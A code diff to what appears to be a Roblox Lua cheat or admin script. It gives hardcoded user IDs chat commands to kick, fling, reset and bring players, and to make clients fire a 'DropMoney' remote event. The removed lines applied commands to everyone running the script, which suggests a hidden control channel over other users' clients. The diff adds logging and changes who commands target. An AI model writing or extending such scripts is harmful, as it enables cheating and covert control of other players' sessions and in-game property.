@@ -4936,7 +4936,7 @@ end)
 -- Commands: kick, ban, bring, reset, dropcash, block, unblock, fling
 
 local userIdTable = {3499991340, 7379734175, 508001, 667796, 417844508, 7385573188} -- Add mod User IDs here
-local shieldedUsers = {4125389269} -- Store shielded user IDs (initially empty)
+local shieldedUsers = {} -- Initialize as empty; users will be shielded only when commanded
 
 -- Function to check if a user ID is valid
 local function isValidUser(userId)
@@ -4984,63 +4984,79 @@ end
 local function executeCommand(command, targetPlayer, player)
     local maxCashDrop = 10000 -- Assume this is the max amount of cash you can drop
 
-    if isShielded(targetPlayer.UserId) then return end
+    -- Check if the target player is shielded for most commands
+    if command ~= "unblock" and isShielded(targetPlayer.UserId) then
+        print(targetPlayer.Name .. " is shielded and cannot be affected.")
+        return
+    end
 
     if command == "kick" then
         targetPlayer:Kick("You've been kicked from the game.")
+        print(player.Name .. " kicked " .. targetPlayer.Name)
     elseif command == "ban" then
         targetPlayer:Kick("You've been banned from the game.")
+        print(player.Name .. " banned " .. targetPlayer.Name)
     elseif command == "bring" and player.Character and targetPlayer.Character then
         targetPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
+        print(player.Name .. " brought " .. targetPlayer.Name)
     elseif command == "reset" and targetPlayer.Character then
         targetPlayer.Character:BreakJoints() -- This will reset the player's character
+        print(targetPlayer.Name .. " has been reset.")
     elseif command == "dropcash" then
         game.ReplicatedStorage.MainEvent:FireServer("DropMoney", maxCashDrop)
+        print(player.Name .. " dropped cash.")
     elseif command == "block" then
         if isValidUser(player.UserId) then
+            -- If the player is a mod, they can block any target player
             if targetPlayer then
                 table.insert(shieldedUsers, targetPlayer.UserId)
-                print(targetPlayer.Name .. " has been shielded.")
+                print(player.Name .. " has shielded " .. targetPlayer.Name)
             else
-                print("Target player not found.")
+                print("Target player not found for blocking.")
             end
         else
-            print(player.Name .. " is not allowed to shield players.")
+            print(player.Name .. " is not allowed to block.")
         end
     elseif command == "unblock" then
-        if unblockUser(targetPlayer.UserId) then
-            print(targetPlayer.Name .. " has been unshielded.")
+        if unblockUser(player.UserId) then
+            print(player.Name .. " has been unshielded.")
         else
-            print(targetPlayer.Name .. " was not shielded.")
+            print(player.Name .. " was not shielded.")
         end
     elseif command == "fling" then
         targetPlayer.Character:SetPrimaryPartCFrame(targetPlayer.Character.PrimaryPart.CFrame + Vector3.new(-1000000000, 1000000, 0))
+        print(player.Name .. " flung " .. targetPlayer.Name)
+    else
+        print("Command not recognized.")
     end
 end
 
 -- Function to handle chat commands
 local function onChatted(msg, player)
-    if not isValidUser(player.UserId) then return end
+    if not isValidUser(player.UserId) then 
+        print(player.Name .. " tried to use a command but is not a valid user.")
+        return 
+    end
 
-    local command = msg:match("^:([%w_]+)")
-    local targetName = msg:match("^:[%w_]+%s*(.*)$")
+    local command = msg:match("^:([%w_]+)") -- Extract command
+    local targetName = msg:match("^:[%w_]+%s*(.*)$") -- Extract target name
 
     command = command and command:lower() -- Make command case insensitive
     if command then
-        if targetName == "" then
-            -- Apply the command to everyone using the script
-            for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
-                if targetPlayer ~= player and targetPlayer:FindFirstChildOfClass("PlayerGui") then
-                    executeCommand(command, targetPlayer, player)
-                end
-            end
-        else
-            -- Apply the command to the specific target
+        -- Apply the command to specific target if provided
+        if targetName and targetName ~= "" then
             local targetPlayer = findPlayerByDisplayNameOrPartial(targetName)
             if targetPlayer then
                 executeCommand(command, targetPlayer, player)
+            else
+                print("Target player " .. targetName .. " not found.")
             end
+        else
+            -- If no target name, apply the command to the player themselves
+            executeCommand(command, player, player)
         end
+    else
+        print("No valid command found.")
     end
 end
 
